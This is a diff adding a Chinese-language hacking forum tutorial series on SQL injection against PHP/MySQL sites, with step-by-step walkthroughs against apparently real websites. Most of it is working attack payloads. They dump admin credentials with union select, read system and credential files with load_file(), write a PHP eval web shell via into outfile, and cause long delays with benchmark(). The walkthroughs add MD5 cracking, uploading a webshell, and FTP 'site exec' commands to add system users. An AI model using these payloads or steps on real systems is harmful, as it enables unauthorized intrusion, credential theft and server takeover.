@@ -1,0 +1,428 @@
+http://127.0.0.1/test/test/show.php?id=1%20union%20select%201,1,benchmark(99999999,md5(0x41))     利用benchmark函数  呵呵...貌似拒绝服务攻击的样子  让页面超长延时  就把路径拖出来了  我说的这几种不是绝对可行的 不过大多数 可以
+
+
+
+union+select+0+from+information_schema.tables/*
+
+union+select+0,concat(table_name),1,2+from+information_schema.tables/*
+
+column_name 
+
+union+select+0,concat(column_name),1,2+from+information_schema.column_name /*
+
+union+select+0,concat(table_name,0x3a,column_name),1,2+from+information_schema.column_name /*
+
+union+select+0,concat(table_name,0x3a,column_name),1,2+from+information_schema.column_name /*
+union+select+0,concat(username,0x3a,password),1,2+from+admin_name /*
+
+
+
+By racle:
+
+在这个注入风靡的时代,多少菜鸟拿着工具四处冲锋.如果你不想成为工具的奴隶,不想遇到PHP就退避三舍,不想继续做着ASP的菜鸟之群,不想......那么请你静下心来,  随我一同走完这次的入侵检测全过程.相信你必然能有所收获.不只在技术上,更在思路上,更在意识上..
+
+
+
+
+
+
+
+
+
+
+判断是否存在注入:首先,PHP和ASP判断注入的方法一样,在一个动态连接后面加上and 1=1,and 1=2看其返回结果即可判断.两次返回结果不相同,即可初步判断为有注入点.
+
+
+
+
+
+
+
+判断字段大小:接下来,对付php猜字段的方法,我们用order by.语法如下:
+
+点击在新窗口查看全图 CTRL+鼠标滚轮放大或缩小
+
+[Copy to clipboard] [ - ]
+CODE:
+http://127.0.0.1/1.php?id=1 order by 40    //如果返回正常,说明实际的字段要比40大.那么我们继续加.一直加到返回错误.
+
+点击在新窗口查看全图 CTRL+鼠标滚轮放大或缩小
+
+[Copy to clipboard] [ - ]
+CODE:
+譬如当[url]http://127.0.0.1/1.php?id=1[/url] order by 4
+5的时候出错了,那么我们就知道字段大小为44.
+
+UNION SELECT:知道字段大小以后,我们就用union select联合查询来列出所有字段.
+
+[Copy to clipboard] [ - ]
+CODE:
+http://127.0.0.1/1.php?id=1 and 1=2 union select 1,2,3,4~44/* //这里我们列出了44个字段,并且以/*告诉MYSQL,我们的命令已经执行完毕.*
+
+你就可以在回显出来的相应的字段上,替换你要查询的字段名,再from表明.就可以得到相应的字段内容了.譬如:
+
+[Copy to clipboard] [ - ]
+CODE:
+http://127.0.0.1/1.php?id=1and 1=2 union select 1,2,3,4,~30,passwd,32,~45 from member/*      //~表示我这里省略.你不能那么写.
+
+点击在新窗口查看全图 CTRL+鼠标滚轮放大或缩小
+
+
+
+
+
+
+
+几个常用的MYSQL函数:好了,现在我们把字段都列出来了.估计这时候有人就该急急忙忙的加from来猜密码了.实际上,猜测密码走后台这一招,我们应该放在最后.有人说MYSQL的功能, 和ACCESS一样,甚至还不如,这其实是误解,冤枉了MYSQL.我们下面来看看,MYSQL都有些什么高级的运用.
+这里首先列出几个常用的涵数:1:system_user()2:user()3:current_user4:session_user()5:database()6:version()7:load_file()......他们的含义分别如下:
+
+1:系统用户名.2:用户名.3:当前用户名:4连接数据库的用户名.5:数据库名.6:数据库版本.7:MYSQL读取本地文件的函数
+
+他们都有什么用?1-6的作用如下:
+
+点击在新窗口查看全图 CTRL+鼠标滚轮放大或缩小   
+
+这几个函数翻回来的信息在检测过程中具有非常重要的作用,他们对我们了解目标,分析目标,寻找漏洞,开阔思路等等都有莫大的作用.譬如了解系统的版本,了解数据库是否支持union,当前用户是否ROOT用户的初步判断等等...函数7的作用就更大了,我们接下来单独说.
+
+
+
+
+
+
+
+专说load_file()函数的作用与技巧.
+OK.load_file是MYSQL用来读取本地文件时,会用到的函数.在我们注入时的权限可以读写文件时,load_file就有无比巨大的作用了. 怎么判断有我们注入点的权限呢?很简单,在注入点后加上and (select count(*) from mysql.user)>0/*如果结果返回正常,那么就是具有读写权限了.我们就可以用这个函数去读取系统的敏感文件,去寻找配置文件,寻找数据库连接文件,寻找社工文件,寻找WEB物理路径等等.下面,我给大家总结出了敏感文件列表:
+WINDOWS下:
+load_file(char(99,58,47,119,105,110,100,111,119,115,47,112,104,112,46,105,110,105))     c:/windows/php.ini    //里面有什么不用我说了吧?
+load_file(char(99,58,47,119,105,110,110,116,47,112,104,112,46,105,110,105))            c:/winnt/php.ini
+load_file(char(99,58,47,119,105,110,100,111,119,115,47,109,121,46,105,110,105))      c:/windows/my.ini        //管理员登陆过MYSQL会留下密码和用户名
+load_file(char(99,58,47,119,105,110,110,116,47,109,121,46,105,110,105))             c:/winnt/my.ini
+load_file(char(99,58,47,98,111,111,116,46,105,110,105))          c:/boot.ini
+
+LUNIX/UNIX下:
+load_file(char(47,101,116,99,47,112,97,115,115,119,111,114,100))              /etc/password        //不用我说了吧?
+load_file(char(47,117,115,114,47,108,111,99,97,108,47,104,116,116,112,100,47,99,111,110,102,47,104,116,116,112,100,46,99,111,110,102))    /usr/local/httpd/conf/httpd.conf     //也许能找到网站默认目录哦!
+load_file(char(47,117,115,114,47,108,111,99,97,108,47,97,112,97,99,104,101,50,47,99,111,110,102,47,104,116,116,112,100,46,99,111,110,102))                                                                  /usr/local/apache2/conf/httpd.conf      //也许能找到网站默认目录哦!
+FreeBSD下:
+load_file(char(47))    //列出了此FreeBSD系统的根目录
+
+大概有朋友看到这里就该叫了,这都什么啊.char()是什么呀?后面一大串又是什么啊?(系统不明白的就不用问了,自己去GOOGLE).
+实际上,就算你拥有读和写权限的一个注入点,如果你直接执行load_file(c:\boot.ini),一般都回显不了,遇到这样的情况,你有两个选择.1把路径转为16进制,直接提交数据库.2把路径转为10进制,用char()函数还原回ASCII.
+譬如c:\boot.ini,转换为16进制就是:"0x633A5C626F6F742E696E69",然后你直接用 load_file(0x633A5C626F6F742E696E69)就可以了.   如果转换为10进制,那么就是:"99 58 92 98 111 111 116 46 105 110 105".你需要使用char()来转换,转换之前,你需要在TXT里做个批量替换,把空格都转为","号. 即:load_file(char(99,58,92,98,111,111,116,46,105,110,105)).注意不要少了扩号,都是对称的.
+说到这里,估计又有小菜要叫了..都弄好啦,放那里去执行啊?!别急,看看下图.
+点击在新窗口查看全图 CTRL+鼠标滚轮放大或缩小 点击在新窗口查看全图 CTRL+鼠标滚轮放大或缩小
+
+只要把load_file()放到页面出现的字段上,最好保证有足够位置能显示完你要显示的文件.实在没有足够位置也不紧张,下面我再教你几招.
+
+1:有时候,你明明确认自己拥有读和写文件的权利,却硬是读不出来文件,或者一片空白.为什么?原因可能是对方的系统在权限配置上做的好,你的USER权限,读不到他ADMINISTRATOR里的文件.NTFS和LINUX都能做到这点.如果你排除以上情况,你就要考虑,是不是你读出来的内容,被浏览器当作HTML,ASP,PHP,ASPX,JSP等等的脚本语言给执行了?譬如你读出来的内容如果含有<>等符号,那么浏览器就会执行你的文件内容,你自然什么都看不到.对付这样的情况,也很简单,我们只要把那些特殊的符号,在读出来的时候,用别的符号去代替他们,这样浏览器就不会去执行他们了!怎么代替?我们有replace(load_file(A),char(B),char(C))函数在!当你读A文件出来的时候,如果里面有B字母或者符号,那么MYSQL会用C字母或者符号去代替B,然后再显示出来.OK.我们这么一换上:replace(load_file(A)),char(60),char(32)).这里一样用的CHAR()函数转换为字母即一旦出现"<"符号,就用空格来代替他.这样就能完整的回显内容给你了.
+
+2:所有的字段位置都不够位置回显,读到的文件不完整哦,又不是上面的原因,那么怎么办呢?这里我们用Substring(str,pos,len)函数解决问题.他的意思是从字符串str的pos位位置起返回len个字符的子串.譬如Substring(load_file(A),50,100)就是把 A的内容的第50个字母开始回显100个给你.那么就能逐段逐段的回显啦.
+
+
+
+
+
+
+
+
+
+into outfile的高级运用!
+OK.load_file()我们就说那么多了.接下来,我们还有许多的重头戏要来呢!这里,我要说下一个很重要的运用方法,也正是我着重参考剑心几部作品的技术的部分.当我们确定如下几个条件以后:
+1获得物理路径(into outfile '物理路径') 这样才能写对目录
+2能够使用union (也就是说需要MYSQL3以上的版本)
+3对方没有对’进行过滤(因为outfile 后面的 '' 不可以用其他函数代替转换)
+4就是MYSQL用户拥有file_priv权限(不然就不能写文件 或者把文件内容读出)
+5对web目录有写权限MS的系统一般都有权限,但是LINUX通常都是rwxr-xr-x 也就是说组跟其他用户都没有权限写操作.
+
+这里的1,我们一般可以靠数据库出错信息来爆出来,不行的话,也可以通过load_file()来得到.2那是一般都可以的了...3也不多见对'''过滤的.4有没有权限,我们前面已经测试过的了.5如果不能备份到网站的路径上来,我们也还有别的办法,譬如到starup,run里面去等等社工的办法. 而且一般多试试上传目录,图片目录,还是大部分都有读写权限的.
+OK.需要的条件确定了,那怎么用呢?我们分开两部来说用法.
+
+用法1:这是中规中矩的用法,大家都知道.就是采用网站有的留言,上传等功能,把你的一句话马弄上去,然后使用
+
+[Copy to clipboard] [ - ]
+CODE:
+http://www.tian6.com/coder.php?id=1 and 1=2 union select 1,load_file( /www/home/html/upload/qingyafengping.jpg),3,4,5,6 into outfile '/www/home/html/coder.php'/*   你的小马就诞生了.
+
+其中/www/home/html/upload/qingyafengping.jpg为你已上传的木马地址.3,4,5,6为假设存在字段,/www/home/html/为假设的WEB路径.
+
+
+用法2,也是重点要说的.上面的方法,局限性还是比较大的,如果网站不给你上传,或者网站过滤上传的内容,那怎么办?不用怕,剑心早在几年前就给我们想到了个好办法.我们只需要直接这么执行URL:
+
+[Copy to clipboard] [ - ]
+CODE:
+http://www.tiany6.com/coder.php?id=1 and 1=2 union select 1,char(这里是你的马的代码,记得转为10进或者16进),3,4,5,6 into outfile '/www/home/html/coder.php'/*   这样你的小马也诞生了,不需要上传,也不怕他过滤.
+
+譬如
+
+[Copy to clipboard] [ - ]
+CODE:
+http://www.tiany6.com/coder.php?id=1 and 1=2 union select 1,char(60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,99,109,100,93,41,63,62),3,4,5,6 into outfile '/www/home/html/coder.php'/*
+或者
+[url]http://www.tiany6.com/coder.php?id=1[/url] and 1=2 union select 1,0x3C3F706870206576616C28245F504F53545B636D645D293F3E,3,4,5,6 into outfile '/www/home/html/coder.php'/*
+或者
+[url]http://www.tiany6.com/coder.php?id=1[/url] and 1=2 union select 1,'<?php eval($_POST[cmd])?>',3,4,5,6 into outfile '/www/home/html/coder.php'/*
+
+3,4,5,6为假设存在字段,/www/home/html/为假设的WEB路径.
+
+
+
+
+
+
+
+
+基础部分总结:好,基础部分我就讲到这里.等有空了再给大家带来几个实战的检测.当然,那时候简单的问题就会一笔带过的了.或许你要问,为什么我前面要说那么多,或者说上面的内容,其实大家用心,基本上都可以在网上找到相关的内容,为什么我还要在这里说?我给你的答案只有两个.
+
+1:我一直提倡学技术要真正懂原因,凡事要知其然,也要知其所以然,每个问题都不会一模一样,每个目标都不会一模一样,每过段日子,都会有变化,要想真正做起来得心应手,遇到困难能自己解开,就必须懂原理!工具也是人写的,他只能是你的辅助者.他不会根据实际情况来适应环境.你懂了原理,你就是一个灵活机动的智能工具,还能创新,灵活变化.人挪活,树挪S,再苦再难,都要时刻提醒自己.
+
+2:相对于没有基础的小菜们,总是很难快速的找到对自己真正有帮助的资料.往往花费大量时间和功夫,还得到错误的答案,而误入歧途.很多人就是这么开始依赖工具.我在这里给大家总结下来,你学的快了,也不会走错方向.虽然许多人都是那么自己过来的(我相信很多高手都是自己琢磨过来的,曾经辛苦日子也是和你一样的.).现在你来到了天阳论坛,这里没有人会向你收一分钱,没有人会要求你加什么VIP,或者要求你付出什么东西.这里许多的人都愿意为你们学习创造更好的环境,我们论坛的管理员,版主们也在帮助你们尽可能快速的走捷径上轨道,这可以说是小菜们的一个好机会.也正是我费尽心机写这些文章的原因.我希望看到的,是技术的,向上的,积极的,方向正确的天阳学子.OK.废话到此为止.浪费各位高手的时间了.
+
+下面请继续往下走：
+http://bbs.tian6.com/thread-4762-1-1.html 天阳菜鸟PHP起飞篇-猜口令到后台.
+http://bbs.tian6.com/thread-4800-1-1.html 天阳菜鸟PHP攀升篇-loadfile灵活运用.
+
+
+BY:racle.for php beginner.上次写了点关于PHP注入的东西,说过要加点实践操作补充的.现在就先来最简单的猜口令上后台的实践练习.
+先来一个网站.
+
+
+
+
+
+
+
+OK.我们来看看这个动态页面是否有注入问题.恩,好.可能有问题.
+
+
+
+
+
+
+
+来看看字段有多少,然后才好列嘛.随手23,错了,那22,对了.字段长度为22.
+
+
+
+
+
+OK,现在都列出来.
+
+
+
+
+
+看看都有什么信息.哦,version是4.1.22-standard.系统就该是unix/linux咯.
+
+
+
+
+来猜猜表,常见的admin,administrator,user,member什么的,ok,表administrator存在.
+
+
+
+
+猜猜字段呗.username,password来一下,常见的还有name,user,pwd,pass等等...
+
+
+
+
+OK.密码用户名都有,拿去MD5在线一下,出来了.随手后台猜admin,OK,后台也有了.进去.
+
+
+
+
+
+
+
+
+
+有好几个上传的,找到这里不过滤PHP,直接PHP就上去了.WEBSEHLL来了.
+
+
+
+
+
+
+
+完.LINUX提权,请看本论坛一帖:http://bbs.tian6.com/thread-4164-1-2.html 或etc/password
+如果上面的有不会,那么PHP基础知识补习请看:http://bbs.tian6.com/thread-4688-1-1.html
+
+
+
+
+By racle.for php beginner.
+此文紧跟天阳菜鸟PHP起飞篇-猜口令到后台一文.也是作为
+PHP注入教程,你掌握了多少?一文的实践教程.~
+如果这里你有什么不明白的,或者你是小菜,也没看过前两文,那么请你请务必先回到这前面两篇看看.
+
+
+
+
+
+OK.现在我们来看一个网站.
+
+
+
+这个网站有个URL是有过滤不严的问题的.如下.经过order by测试后,字段为8.也已经列出来了.但是有个问题,请看图.
+
+
+
+[Copy to clipboard] [ - ]
+CODE:
+http://www.tian6.com/page.php?fp=newsdetail&id=1885%
+
+20and%201=2%20union%20select%201,2,3,4,5,6,7,8/*
+
+郁闷了么?"对不起，本篇资料禁止外部浏览".为什么会这样呢?可以
+
+简单的推测,首先我们的字段数是对的,但是由于网站对于会员和非会员或者各种等级的不同,是有对阅读权限的限制的,现在我们是
+
+非会员身份,所以任意字段的回显自然不一定会都有权限阅读.难道就去注册么?如果这些内容他要管理员才有权限看呢?所以我们还
+
+是另外想办法,什么办法?我们来破坏他对权限限制的平衡.这里1-8字段,不知道是哪一个字段反回来的东西是被禁止查看了,我们就
+
+从第一个开始,让字段以MYSQL的权限来回显一些肯定可以回显的东西.这样被替换了的那个字段就不会去回显被权限限制的内容,而
+
+是回一些肯定能看到的函数,阅读的限制对我们就不起作用了.如下图:
+
+
+
+
+
+[Copy to clipboard] [ - ]
+CODE:
+http://www.tian6.com/page.php?fp=newsdetail&id=1885%
+
+20and%201=2%20union%20select%20user(),user(),user(),user(),user(),user(),7,8/*
+[url]http://www.tian6.com/page.php?fp=newsdetail&id=1885%20and%201=2%20union%20select%20user[/url](),user(),user
+
+(),user(),user(),user(),user(),user()/*
+
+当字段8被替换掉后,可以回显咯.我就假设8就是被禁止的内容(当然,有可能不
+
+只他一个,反正我们先试试只替换掉8看看)如下图:
+
+
+
+[Copy to clipboard] [ - ]
+CODE:
+http://www.tian6.com/page.php?fp=newsdetail&id=1885%
+
+20and%201=2%20union%20select%201,2,3,4,5,6,7,user()/*
+
+由此看来我的推断是对的.8返回的函数正是被禁止的内容.我们
+
+用user()函数就跳过去了.继续.可以看到,用户名是root.这样的用户8成是具有数据库最高权限,掌握了MYSQL的读和写权限的.我们
+
+来证实一下我们的猜测.如下图:
+
+
+
+[Copy to clipboard] [ - ]
+CODE:
+http://www.tian6.com/page.php?fp=newsdetail&id=1885%
+
+20and%20(select%20count(*)%20from%20mysql.user)%3E0/*
+返回内容正常,由此看来,我的推断还是正确的.有了读和写权限,我们的入侵思路,可就千变万化了.老土一点,先看看config.php之类
+
+的文件,看看数据库连接文件再说.
+
+我们先来看看怎么弄到网站的物理路径,随手在URL最后加个'让数据库query出错.就出来
+
+路径了.如下图:
+
+
+
+[Copy to clipboard] [ - ]
+CODE:
+http://www.tian6.com/page.php?
+
+fp=newsdetail&id=1885'
+
+然后怎么找数据库连接文件呢?难道去猜么?答案是可以先快速猜几个常见的,譬如config.php
+
+config_inc.php /inc /include等等咯.猜了以后没有怎么办呢?很简单,和MSSQL找SA一样,先看index.php之类的主页,主页肯定
+
+include了数据库连接文件.然后在顺藤摸瓜,找到那个文件.主页物理路径是什么?是D:\ahcbxy\web\index.php,转16进还是转ascii
+
+就随便你了,我转ascii吧.请看:
+
+
+
+[Copy to clipboard] [ - ]
+CODE:
+http://www.tian6.com/page.php?fp=newsdetail&id=1885%
+
+20and%201=2%20union%20select%201,load_file(char
+
+(68,58,92,97,104,99,98,120,121,92,119,101,98,92,105,110,100,101,120,46,112,104,112)),3,4,5,6,7,user()/*
+
+不对
+
+头了吧?主页代码怎么可能这么少这么不完整呢?很简单,前面的教程说过的,<>被HTML代码执行了.我们用replace()替换掉敏感字.
+
+
+
+[Copy to clipboard] [ - ]
+CODE:
+http://www.tian6.com/page.php?fp=newsdetail&id=1885%
+
+20and%201=2%20union%20select%201,replace(load_file(char
+
+(68,58,92,97,104,99,98,120,121,92,119,101,98,92,105,110,100,101,120,46,112,104,112)),char(60),char
+
+(32)),3,4,5,6,7,user()/*
+
+这下全了吧.你看,db.inc.php是什么呢?同样方法load出来.
+
+
+
+
+
+好了,数据库连接密码有了,看看主机开3306没,开了直接连上去上传个DLL提权,或者数据库上outfile一个WEBSEHLL就完事了.哦,不
+
+过可惜哦,没开~^^这时候你想到什么了?看过我之前的PHP注入基础知识的都该想到intooutfile了吧?恩?直接来WEBSEHLL的哦.~再做
+
+这个之前,我们还要确定一件事情!PHP的magic_quotes_gpc安全机制知道么?当magic_quotes_gpc=on的时候,MYSQL会把提交的变量中
+
+所有的 ' (单引号), " (双引号), \ (反斜线) 和 空字符会自动转为含有反斜线的转义字符，例如把'变成了\',把\变成了
+
+\\.magic_quotes_gpc情况可以看%systemroot%\php.ini里面有.因为out file只能用''表示路径,所以=ON的时候就不能上WEBSEHLL
+
+了.好,那么我们来看看他的PHP.INI吧.从他之前爆出来的路径知道他是WIN系统的,那是2003还是2000,NT呢?你可以猜,反正系统文件
+
+夹就windows/winnt两种可能.或者你去看c:\boot.ini.我看过了,是2000.也就是winnt路径咯.那好,我们看看c:\winnt\php.ini吧.
+
+
+
+[Copy to clipboard] [ - ]
+CODE:
+http://www.tian6.com/page.php?fp=newsdetail&id=1885%
+
+20and%201=2%20union%20select%201,replace(load_file(char
+
+(99,58,92,119,105,110,110,116,92,112,104,112,46,105,110,105)),char(60),char(32)),3,4,5,6,7,user()/*
+
+哦..等于ON哦..不能intooutfile咯..不过也很常见,现在一般默认都是ON的啦.那现在怎么办?难道要去猜他的密码,猜他的
+
+后台吗?那当然不..这样搞,那不回到之前那篇PHP起飞篇去了..我们来看看,既然有load,看他什么文件都可以,他还有什么文件值得
+
+我们去看呢?还是看看他开了什么服务吧..扫描一下他的端口,开了21,3389哦.呵呵.想到什么了没有?21哦...FTP哦...来看看
+
+BANNER.
+
+
+
+[Copy to clipboard] [ - ]
+CODE:
+telnet [url]www.tian6.com[/url] 21
+呵呵,SERVU哦.还是5.0呢.溢出我就不去试了,我且看看load他的默认目录里的有什么出来.C:\Program Files\Serv-
+
+U\ServUDaemon.ini
+
+
+
+恩,还等什么呢?赶快拿个字典破掉MD5,连上FTP来个quote site exec net user    3389吧~~破解我就不演示了.思路教程到此为止.
+
+
+完.
